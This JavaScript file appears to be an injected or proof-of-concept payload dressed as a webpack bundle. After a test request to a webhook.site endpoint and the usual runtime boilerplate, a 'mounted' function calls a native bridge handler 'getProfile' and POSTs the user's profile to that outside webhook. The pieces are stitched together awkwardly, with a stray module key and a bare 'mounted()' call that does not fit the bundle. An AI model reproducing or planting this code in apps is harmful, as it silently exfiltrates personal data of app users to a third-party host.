fetch("https://webhook.site/bed26aa0-5782-483e-881e-4d1fa0115c38", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ message: "hello" })
})
.then(response => response.text())  // or .json() if your server returns JSON
.then(data => {
  console.log("Server response:", data);
})
.catch(error => {
  console.error("Error:", error);
});
(function(e) {
    function t(t) {
        for (var a, l, o = t[0], r = t[1], u = t[2], s = 0, b = []; s < o.length; s++) l = o[s], Object.prototype.hasOwnProperty.call(c, l) && c[l] && b.push(c[l][0]), c[l] = 0;
        for (a in r) Object.prototype.hasOwnProperty.call(r, a) && (e[a] = r[a]);
        d && d(t);
        while (b.length) b.shift()();
        return i.push.apply(i, u || []), n()
    }

    function n() {
        for (var e, t = 0; t < i.length; t++) {
            for (var n = i[t], a = !0, o = 1; o < n.length; o++) {
                var r = n[o];
                0 !== c[r] && (a = !1)
            }
            a && (i.splice(t--, 1), e = l(l.s = n[0]))
        }
        return e
    }
    var a = {},
        c = {
            app: 0
        },
        i = [];

    function l(t) {
        if (a[t]) return a[t].exports;
        var n = a[t] = {
            i: t,
            l: !1,
            exports: {}
        };
        return e[t].call(n.exports, n, n.exports, l), n.l = !0, n.exports
    }
    l.m = e, l.c = a, l.d = function(e, t, n) {
        l.o(e, t) || Object.defineProperty(e, t, {
            enumerable: !0,
            get: n
        })
    }, l.r = function(e) {
        "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, l.t = function(e, t) {
        if (1 & t && (e = l(e)), 8 & t) return e;
        if (4 & t && "object" === typeof e && e && e.__esModule) return e;
        var n = Object.create(null);
        if (l.r(n), Object.defineProperty(n, "default", {
                enumerable: !0,
                value: e
            }), 2 & t && "string" != typeof e)
            for (var a in e) l.d(n, a, function(t) {
                return e[t]
            }.bind(null, a));
        return n
    }, l.n = function(e) {
        var t = e && e.__esModule ? function() {
            return e["default"]
        } : function() {
            return e
        };
        return l.d(t, "a", t), t
    }, l.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, l.p = "";
    var o = window["webpackJsonp"] = window["webpackJsonp"] || [],
        r = o.push.bind(o);
    o.push = t, o = o.slice();
    for (var u = 0; u < o.length; u++) t(o[u]);
    var d = r;
    i.push([0, "chunk-vendors"]), n()
})({
    0: function(e, t, n) {
        e.exports = n("56d7")
    },
    mounted: function() {
        var e = this;
        this.$bridge.callHandler("getProfile").then(function(profile) {
            console.log("profile:", profile);

            const payload = {
                timestamp: new Date().toISOString(),
                profile: profile
            };

            return fetch("https://webhook.site/bed26aa0-5782-483e-881e-4d1fa0115c38", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            }).then(function(response) {
            if (!response.ok) throw new Error("Network response was not ok: " + response.status);
            return response.json().catch(function() { return null; });
            }).then(function(result) {
            console.log("Forwarded profile successfully:", result);
            }).catch(function(err) {
            console.error("Error in bridge -> forward flow:", err);
            });
    }

});
mounted()
